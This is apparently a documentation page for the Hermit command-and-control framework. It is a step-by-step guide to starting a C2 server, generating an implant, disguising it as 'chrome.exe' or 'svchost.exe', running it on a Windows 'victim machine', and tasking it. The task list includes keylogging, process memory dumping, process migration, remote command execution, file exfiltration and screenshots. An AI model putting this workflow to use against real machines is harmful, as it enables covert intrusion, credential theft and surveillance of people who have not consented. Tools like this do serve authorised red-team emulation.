# Simple Implant Beacon

This page introduces the basic usage of execute the implant beacon on Windows victim machine.  

Assume that you've already installed Hermit.  
If not yet, see [the Installation page](../installation.md) and try [Getting Started](../getting-started.md).

## 1. Start C2 Server

Go to the Hermit project directory then run `./hermit` command.

![hermit server start](../assets/images/terminal/hermit_server_start.png)

## 2. Start HTTPS Listener

![listener start](../assets/images/terminal/listener_start.png)

## 3. Generate Implant Payload

![payload gen](../assets/images/terminal/payload_gen.png)

The implant is saved under `$HOME/.hermit/server/listeners/listener-<name>/payloads/` folder.  

### Transfer the Implant

Transfer the implant (`.exe`) to the Windows target computer.  
At that time, it's recommended to rename the filename because the word "implant" in the file name is too dignified.  
For example, rename it with "chrome.exe", "svchost.exe", etc.

## 4. Execute Implant

On the victim machine, execute the implant as below:  

```ps title="Windows Victim Machine"
# Replace the filename with your own.
.\implant.exe
```

## 5. Switch to Agent Mode

After a few seconds, the agent checked in and listed on the C2 server.  
You can check the agent listed with the `agents` command.

![agent list](../assets/images/terminal/agent_list.png)

Now switch to Agent Mode by specifying the agent ID (e.g. `1`):

![agent use](../assets/images/terminal/agent_use.png)

## 6. Send Task & Get the Result

In Agent Mode, you can send tasks and get results.  
To see what tasks are available, run `?` or `help` command.  
Currently, the following tasks are available:

```txt
TASK
====

  cat      <FILE>        : Print the contents of a file
  cd       <DIR>         : Change the working directory
  cp       <SRC> <DEST>  : Copy a file
  download <SRC> <DEST>  : Download a file from the target computer
  execute  <CMD>         : Execute a system command on target computer
  ip                     : Get IP addresses for target computer
  keylog   <NUM>         : Keylogging for N seconds
  kill                   : Stop the implant process
  ls       <DIR>         : List files in a directory
  migrate  <PID>         : Get into another process
  mkdir    <DIR>         : Create a new directory
  mv       <SRC> <DEST>  : Move a file to a destination location
  net                    : Get TCP connections
  procdump <PID>         : Dump process memory to a specified output file
  ps                     : List processes that are running
  ps kill  <PID>         : Kill a specified process
  pwd                    : Print the current working directory
  rm       <FILE>        : Remove a file
  rmdir    <DIR>         : Remove a directory
  screenshot             : Take a screenshot on target computer
  sleep    <NUM>         : Set sleep time (seconds) between requests from beacon
  upload   <SRC> <DEST>  : Upload a file to the target computer
  whoami                 : Print the current username

  task clean             : Remove all tasks from waitlist
  task list              : List tasks waiting for the results
  tasks                  : Alias for 'task list'
```

First, let's try sending the `whoami` task to the agent.  
This task retrieves the username on the victim machine.  

![task send](../assets/images/terminal/task_send.png)

To see the tasks waiting for results, run the `tasks` command.  
*However the Implant beacon sleep time is 3 seconds by default, so you need to run thie `tasks` command immediately after executing the `whoami` command.


After a few seconds, if the task is successful, you can see the task results with the `loot` command:

![loot](../assets/images/terminal/loot.png)

Please try other tasks as well.

## 7. Quit Agent Mode

After emulations, simply run the `exit` command to quit Agent Mode.  
You should quit and return to the original console.
